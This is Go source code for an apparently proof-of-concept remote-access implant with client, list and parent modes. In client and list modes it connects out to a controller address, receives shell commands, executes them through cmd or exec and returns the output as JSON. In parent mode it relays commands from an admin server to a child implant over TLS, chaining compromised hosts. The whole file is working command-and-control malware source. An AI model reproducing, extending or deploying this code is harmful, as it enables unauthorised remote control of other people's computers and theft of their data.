package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	// "/Blog/POC_Malwarez/arp_connect_main/ARP"
)

var (
	clientConnect = flag.String("clientconnect", "", "Where the client should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	parentConnect = flag.String("parentconnect", "", "Where the parent should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	// parentListen string = "127.0.0.1:10000"
	skipEnter = flag.Bool("skip", false, "Will skip Enter requirement and run automatically, speeds testing")
)

type Results struct {
	CommandsList []string
	ID           int
	Command      string
	Output       string
	Time         string
}

func checkError(err error) {
	if err != nil {
		fmt.Println("Fatal error ", err.Error())
		os.Exit(1)
	}
}

// remove ARP
// add Client mode

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func getTime() string {
	currentTime := time.Now()
	return currentTime.Format("2006-01-02 15:04:05")

}

func executeCommand(checkOS string, commandString string) *Results {

	var results string
	if checkOS == "windows" {
		// fmt.Println("WINDOWS")
		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		if err != nil {
			fmt.Println("Error executing command", err)
			// c.Write([]byte("unable to execute command"))
			CommandExec = []byte("Error executing command")
			// NEED TO FIX UNABLE TO EXECUTE SENDING
		}
		CommandExec2 := string(CommandExec)
		results = strings.TrimSpace(CommandExec2)
		// fmt.Println(reflect.TypeOf(CommandExec))
		// fmt.Println(reflect.TypeOf(err))

	} else if checkOS == "linux" {
		// fmt.Println("LINUX")
		//fmt.Println("XS", command)
		CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
		if err != nil {
			fmt.Println("Error executing command", err)
			// c.Write([]byte("unable to execute command"))

		}
		CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
		results = strings.TrimSpace(CommandExec2)
	}
	// fmt.Println(results2)
	// results2 := [...]string{results, "END"}
	//writing
	// fmt.Fprintf(c, results2)

	//using the Results structure
	currentTime := getTime()
	outputTest := &Results{
		ID:      1, // TODO: need to make this random for multiple children
		Output:  results,
		Time:    currentTime,
		Command: commandString,
	}
	// jsonMS, _ := json.Marshal(outputTest)
	return outputTest
}

func listMode() {
	fmt.Println("###PRINTING TO SCREENONLY in ListMode")

	fmt.Println("Running in Command List Mode")
	fmt.Println("Please note, List Mode does not use TLS\n")

	if *skipEnter == false {
		reader := bufio.NewReader(os.Stdin)
		fmt.Println("<PRESS ENTER TO CONTINUE>")
		_, _ = reader.ReadString('\n')
	}
	// clientConnect2 := *clientConnect
	c, err := net.Dial("tcp", *clientConnect)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer c.Close()
	fmt.Println("Attempting to connect to ", *clientConnect, "\n")
	fmt.Println("===Connection successful==")
	fmt.Println("Reading Commands list")

	// if c has no connect, break

	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	decoder.Decode(&inputTest)
	checkOS := OSCheck()
	for _, value := range inputTest.CommandsList {
		fmt.Println("Command Received->: " + value)

		commandString := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)
		// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))

		encoder.Encode(commandString)
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&outputTest)
		fmt.Println("Encoded format:", commandString)
	}
}

func clientMode() {
	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
	fmt.Printf("Attempting to connect to %s \n", *clientConnect)

	CA_Pool := x509.NewCertPool()
	severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
	if err != nil {
		log.Fatal("Could not load server certificate!")
	}
	CA_Pool.AppendCertsFromPEM(severCert)

	config := tls.Config{RootCAs: CA_Pool}
	c, err := tls.Dial("tcp", *clientConnect, &config)
	// c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer c.Close()
	fmt.Println("===Connection Successful==")
	fmt.Println("Listening for commands")
	checkOS := OSCheck()
	for {

		// if c has no connect, break

		commandString := bufio.NewScanner(c)
		commandString.Scan()

		fmt.Println("Command Received->: " + commandString.Text())
		value := string(commandString.Text())
		if strings.TrimSpace(value) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())

		commandresults := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)

		encoder.Encode(commandresults)

		fmt.Println("Encoded format:", commandresults)

	}

}

func parentMode() {
	// TLS FOR CONNECTING TO ADMIN INTERFACE:
	fmt.Println("RUNNIGN IN PARENTMODE")
	CA_Pool := x509.NewCertPool()
	severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
	if err != nil {
		log.Fatal("Could not load server certificate!")
	}
	CA_Pool.AppendCertsFromPEM(severCert)

	config := tls.Config{RootCAs: CA_Pool}
	c, err := tls.Dial("tcp", *parentConnect, &config)
	fmt.Println("CONNECTED TO ADMIN, waiting on CHILD")
	// c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println("Unable to connect", err)
		return
	}

	defer c.Close()

	// c, err := net.Dial("tcp", CONNECT)
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	// fmt.Println("CONNECTED TO ADMIN, waiting on CHILD")
	// this may need to be a go routine

	//======

	//TLS SERVER FOR CHILD TO CONNECT
	cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
	checkError(err)

	configServer := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

	// fmt.Println("CREATING SERVER FOR CHILD")
	portSplit := strings.Split(*parentConnect, ":")
	PORT := portSplit[1]
	// l2, err := net.Listen("tcp", PORT)
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }

	l2, err := tls.Listen("tcp", PORT, &configServer)
	// l, err := net.Listen("tcp", *connect)
	checkError(err)
	if err != nil {
		fmt.Println("error listening", err)
		return
	}

	defer l2.Close()

	fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	c2, err := l2.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
	} else {
		fmt.Println("CHILD connected on", PORT)
	}

	for {

		//var results string
		//Reading in ADMIN COMMAND
		commandString, _ := bufio.NewReader(c).ReadString('\n')
		fmt.Print("COMMAND RECEIVED FROM ADMIN->: " + commandString)
		if strings.TrimSpace(string(commandString)) == "STOP" {
			fmt.Println("TCP client exiting...")
			break
		}

		text := commandString
		fmt.Fprintf(c2, text+"\n")

		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("Closing TCP server!")
			return
		}
		buf := make([]byte, 4096)
		// reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}
		// writing to ADMIN server
		c.Write([]byte(buf[:len]))

		//end of main for loop
	}
}

// ===========IF NOT ADMIN YOU CANNOT SEND ARP PACKETS =====
func main() {
	// flags declaration using flag package for CLI arguments
	mode := flag.String("mode", "", "mode {client|parent|list}")

	// commands := flag.Bool("commands", false, "Execute a list of commands")

	//parsing flags
	flag.Parse()

	if *mode == "" {
		flag.PrintDefaults()
		fmt.Println("error in flages")
		os.Exit(1)
	}
	// fmt.Printf("mode: %s", *mode)

	if *mode == "client" {
		clientMode()
	} else if *mode == "parent" {
		fmt.Println("parent mode chosen")
		parentMode()
	} else if *mode == "list" {
		listMode()
	} else {
		fmt.Println("ERROR")
		os.Exit(1)
	}

}
